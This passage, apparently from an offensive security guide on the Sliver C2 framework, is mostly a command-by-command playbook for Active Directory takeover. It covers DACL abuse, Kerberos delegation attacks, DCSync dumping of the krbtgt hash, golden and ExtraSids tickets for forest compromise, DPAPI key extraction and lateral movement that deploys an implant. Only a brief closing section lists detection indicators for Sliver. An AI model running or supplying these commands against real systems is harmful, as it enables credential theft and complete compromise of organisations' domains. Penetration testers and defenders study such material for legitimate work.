execute-assembly /opt/tools/Rubeus.exe ; s4u /user:YOURCOMPUTER$ /rc4:[hash] /impersonateuser:administrator /msdsspn:cifs/SRV01.corp.local /ptt

12.4.3 DACL Exploitation

DACL abuse through Sliver uses .NET assemblies and BOFs to read and modify Active Directory permissions without writing tools to disk.

# Enumerate ACLs for a target object
execute-assembly /opt/tools/ADSearch.exe -- --search "(samaccountname=Domain Admins)" --attributes ntsecuritydescriptor

# Check for abusable ACLs with SharpHound
execute-assembly /opt/tools/SharpHound.exe -- -c ACL --outputdirectory C:\\Windows\\Temp

# ForceChangePassword (if you have that right)
execute-assembly /opt/tools/SharpSploit.dll ; SetAccountPassword CORP\\targetuser NewP@ssw0rd!

# GenericWrite: set an SPN for targeted Kerberoasting
execute-assembly /opt/tools/StandIn.exe -- --object targetuser --spn HTTP/fake.corp.local

# GenericAll on a computer: configure RBCD
execute-assembly /opt/tools/StandIn.exe -- --computer TARGET$ --grant YOURCOMPUTER$ --write

# WriteDacl: grant yourself DCSync rights
execute-assembly /opt/tools/PowerView.exe ; Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity youruser -Rights DCSync

12.4.4 Domain Controller Compromise

Compromising a domain controller grants complete control over the Active Directory environment.

DCSync via secretsdump
# DCSync from Sliver via SOCKS proxy
proxychains -q impacket-secretsdump CORP/admin:'P@ssw0rd'@172.16.1.1 -just-dc-ntlm

# DCSync a specific account
proxychains -q impacket-secretsdump CORP/admin:'P@ssw0rd'@172.16.1.1 -just-dc-user krbtgt

# DCSync via Mimikatz loaded through execute-assembly
execute-assembly /opt/tools/SharpKatz.exe -- --Command dcsync --User corp\\krbtgt --Domain corp.local
Golden Ticket
# Forge a golden ticket with the krbtgt hash
execute-assembly /opt/tools/Rubeus.exe ; golden /rc4:[krbtgt-hash] /domain:corp.local /sid:S-1-5-21-... /user:fakeadmin /ptt

# Via Impacket through SOCKS
proxychains -q impacket-ticketer -nthash [krbtgt-hash] -domain-sid S-1-5-21-... -domain corp.local fakeadmin
export KRB5CCNAME=fakeadmin.ccache
proxychains -q impacket-psexec -k -no-pass corp.local/fakeadmin@DC01.corp.local
DPAPI
# Extract the DPAPI backup key from the DC
proxychains -q impacket-dpapi backupkeys -t corp.local/admin:'P@ssw0rd'@172.16.1.1 --export

# Decrypt DPAPI-protected secrets
execute-assembly /opt/tools/SharpDPAPI.exe ; triage /password:P@ssw0rd

# Dump credential manager vaults
execute-assembly /opt/tools/SharpDPAPI.exe ; credentials /password:P@ssw0rd

12.4.5 Whole Forest Compromise

After compromising a child domain, trust relationships can be exploited to escalate to the forest root.

# Enumerate trust relationships
execute-assembly /opt/tools/ADSearch.exe -- --search "(objectClass=trustedDomain)" --attributes cn,trustDirection,trustType

# ExtraSids attack: forge a golden ticket with Enterprise Admin SID
execute-assembly /opt/tools/Rubeus.exe ; golden /rc4:[child-krbtgt-hash] /domain:child.corp.local /sid:S-1-5-21-[child-sid] /sids:S-1-5-21-[parent-sid]-519 /user:fakeadmin /ptt

# Access the parent domain
execute -o dir \\\\DC01.corp.local\\C$

# Via Impacket
proxychains -q impacket-ticketer -nthash [krbtgt-hash] -domain-sid S-1-5-21-[child-sid] -extra-sid S-1-5-21-[parent-sid]-519 -domain child.corp.local fakeadmin

Methodology

  • Move laterally to a target host using PsExec, WMI, or WinRM: 
    psexec -t 172.16.1.10 -u CORP\\admin -p 'P@ssw0rd' -s /tmp/implant.exe
proxychains -q impacket-wmiexec CORP/admin:'P@ssw0rd'@172.16.1.10
proxychains -q evil-winrm -i 172.16.1.10 -u admin -p 'P@ssw0rd'
  • Identify and exploit delegation (unconstrained, constrained, or RBCD): 
    execute-assembly /opt/tools/ADSearch.exe -- --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes cn,dnshostname
execute-assembly /opt/tools/ADSearch.exe -- --search "(&(objectCategory=*)(msDS-AllowedToDelegateTo=*))" --attributes cn,msDS-AllowedToDelegateTo
  • For unconstrained delegation, coerce DC authentication and capture the TGT: 
    execute-assembly /opt/tools/Rubeus.exe ; monitor /interval:5 /nowrap
execute-assembly /opt/tools/SpoolSample.exe DC01.corp.local DVHOST01.corp.local
execute-assembly /opt/tools/Rubeus.exe ; ptt /ticket:[base64-ticket]
  • For constrained delegation, perform the S4U attack: 
    execute-assembly /opt/tools/Rubeus.exe ; s4u /user:sqlsvc /rc4:[hash] /impersonateuser:administrator /msdsspn:cifs/DC01.corp.local /ptt
  • Abuse DACL rights (ForceChangePassword, GenericWrite, WriteDacl) for escalation: 
    execute-assembly /opt/tools/SharpHound.exe -- -c ACL --outputdirectory C:\\Windows\\Temp
execute-assembly /opt/tools/StandIn.exe -- --object targetuser --spn HTTP/fake.corp.local
execute-assembly /opt/tools/StandIn.exe -- --computer TARGET$ --grant YOURCOMPUTER$ --write
  • DCSync the domain and extract the krbtgt hash: 
    proxychains -q impacket-secretsdump CORP/admin:'P@ssw0rd'@172.16.1.1 -just-dc-user krbtgt
execute-assembly /opt/tools/SharpKatz.exe -- --Command dcsync --User corp\\krbtgt --Domain corp.local
  • Forge a golden ticket for persistent domain access: 
    execute-assembly /opt/tools/Rubeus.exe ; golden /rc4:[krbtgt-hash] /domain:corp.local /sid:S-1-5-21-... /user:fakeadmin /ptt
  • Escalate to the forest root via ExtraSids golden ticket: 
    execute-assembly /opt/tools/Rubeus.exe ; golden /rc4:[child-krbtgt-hash] /domain:child.corp.local /sid:S-1-5-21-[child-sid] /sids:S-1-5-21-[parent-sid]-519 /user:fakeadmin /ptt
execute -o dir \\\\DC01.corp.local\\C$

12.5 Detection and Quick Reference

Detecting Sliver requires monitoring network indicators, endpoint behavior, and binary characteristics.

12.5.1 Detection of Sliver

Detecting Sliver requires monitoring network indicators, endpoint behavior, and binary characteristics.

Network indicators:

  • Default mTLS port 8888 and unusual TLS certificate patterns
  • HTTP C2 traffic uses configurable URL patterns but default paths are known signatures
  • DNS C2 generates high volumes of TXT/A record queries to a single domain
  • JA3/JA3S fingerprints for Sliver's Go TLS implementation

Endpoint indicators:

  • Sliver implants are Go binaries with distinctive section names (.symtab, .gopclntab)
  • In-memory .NET assembly execution via execute-assembly spawns a sacrificial process
  • Named pipe patterns used for implant-to-implant communication
  • ETW telemetry captures .NET assembly loads and AMSI scan events

YARA signatures:

  • Sliver implant strings: sliverpb, bishopfox in unstripped builds
  • Go binary characteristics: PE sections, embedded runtime strings
  • Custom YARA rules matching Sliver protobuf message structures
